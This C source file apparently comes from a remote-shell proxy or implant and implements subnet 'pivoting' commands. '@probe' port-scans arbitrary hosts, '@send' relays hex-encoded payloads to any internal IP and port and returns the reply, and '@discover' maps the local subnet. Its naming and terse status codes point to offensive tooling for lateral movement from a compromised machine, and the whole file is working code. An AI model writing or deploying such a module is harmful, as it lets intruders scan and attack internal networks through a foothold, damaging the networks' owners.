#include "config.h"
#include "shellproxy.h"
#include "subnet.h"

#ifdef CFG_SUBNET_ROUTER

static
int subnet_probe (const char* ip, int port, char* resp, int rsz)
{
	struct socket* so;

	if (subnet_tcp_connect(ip, port, &so)==0) {
		soclose(so);
		snprintf(resp, rsz, "open %s:%d\n", ip, port);
	} else {
		snprintf(resp, rsz, "closed %s:%d\n", ip, port);
	}
	return (0);
}

static
int subnet_send (const char* ip, int port, const char* hex, char* resp, int rsz)
{
	unsigned char payload[SUBNET_MAX_PAYLOAD];
	int plen = subnet_hex_decode(hex, payload, sizeof(payload));

	if (plen<0) {
		snprintf(resp, rsz, "bad hex\n");
		return (0);
	}

	struct socket * so;
	if (subnet_tcp_connect(ip, port, &so)!=0) {
		snprintf(resp, rsz, "!!s %s:%d\n", ip, port);
		return (0);
	}
	if (plen>0 && subnet_tcp_write(so, payload, plen)!=0) {
		soclose(so);
		snprintf(resp, rsz, "!!s %s:%d\n", ip, port);
		return (0);
	}

	int n = subnet_tcp_read(so, (unsigned char*)resp, rsz-1);
	soclose(so);
	if (n<=0) {
		snprintf(resp, rsz, "!!c %s:%d\n", ip, port);
		return (0);
	}
	resp[n] = '\0';
	return (0);
}

int subnet_handle (const char* cmd, char* resp, int rsz)
{
	char ip[64];
	int port;

	if (sscanf(cmd, "@probe %63s %d", ip, &port)==2)
		return (subnet_probe(ip, port, resp, rsz));
	if (sscanf(cmd, "@send %63s %d", ip, &port)==2) {
		char hex[SUBNET_MAX_PAYLOAD];
		if (sscanf(cmd, "@send %*s %*d %2047s", hex)!=1) {
			// no payload?
			snprintf(resp, rsz, "nopl\n");
			return (0);
		}
		return (subnet_send(ip, port, hex, resp, rsz));
	}
	if (strncmp(cmd, "@discover", 9)==0)
		return (subnet_discover(resp, rsz));

	// unknown pivoting cmd
	snprintf(resp, rsz, "usubc\n");
	return (0);
}

#endif
